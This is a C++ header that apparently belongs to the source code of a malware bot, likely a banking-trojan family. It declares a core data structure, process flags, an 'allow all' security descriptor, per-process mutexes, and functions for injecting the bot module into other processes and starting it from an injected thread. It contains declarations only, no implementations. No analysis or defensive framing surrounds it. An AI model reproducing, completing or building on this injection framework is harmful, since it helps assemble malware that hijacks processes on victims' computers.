#pragma once

#include "ntdll.h"

//The structure contains the basic data of the current process.
typedef struct
{
  DWORD proccessFlags; //Personal process details.

  //Current user data.
  struct
  {
    TOKEN_USER *token; //current user token.
    DWORD sidLength;   //Length of SID in pTokenUser.
    DWORD sessionId;   //session ID.
  }currentUser;

  struct
  {
    HMODULE current;
    HMODULE kernel32;
  }modules;

  //security attributes.
  struct
  {
    SECURITY_ATTRIBUTES saAllowAll;
    SECURITY_DESCRIPTOR sdAllowAll;
    void *buf;
  }securityAttributes;

  struct
  {
    LPWSTR process;         //The full path of the current file.
  }paths;

  BYTE integrityLevel;        //The application level.
  DWORD pid;                  //process ID.
  
}COREDATA;
extern COREDATA coreData;

namespace Core
{
  //flags of coreData.processFlags.
  enum
  {
    /*
      The process under WOW64
    */
#   if !defined _WIN64
    CDPF_WOW64                            = 0x001,
#   endif
    
    /*
      Prohibit the creation of processes.
    */
    CDPF_DISABLE_CREATEPROCESS            = 0x010,
    
    /*
      Rights of the process that monitors the integrity of the process bot.
    */
    CDPF_RIGHT_CONTROL                    = 0x080,

    /*
      All rights.
    */
    CDPF_RIGHT_ALL                        = CDPF_RIGHT_CONTROL,

  /*
    The mask, The mask, which must be inherited from process to process.
  */
  CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
  };

  //flags for init().
  enum
  {
    INITF_INJECT_START        = 0x1, //Code execution as inject.
  };
  
  /*
    Init.

    IN flags - startup flags

    Return   - true - in case of success,
               false - in case of error.

    Note: uninit() must be called regardless of the value of this function returns.
  */
  bool init(DWORD flags);

  /*
    Create a unique process mutex.

    IN pid - process ID.

    Return - mutex handle in case of success,
             NULL - if the mutex already exists, or if an error.
  */
  HANDLE createMutexOfProcess(DWORD pid);

 
  /*
    Initialize a new instance of the module.

    IN process       - process.
    IN processMutex  - mutex of newly created process.
    IN proccessFlags - data for the new coreData.proccessFlags, the 
					   current data are inherited by the mask CDPT_INHERITABLE_MASK.

    Return           - module address in the process in case of success,
                       NULL - in case of error.
  */
  void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);

  /*
    The entry point inject as a point thread entry.

    Return - return code.
  */
  DWORD WINAPI _injectEntryForThreadEntry(void *);

};
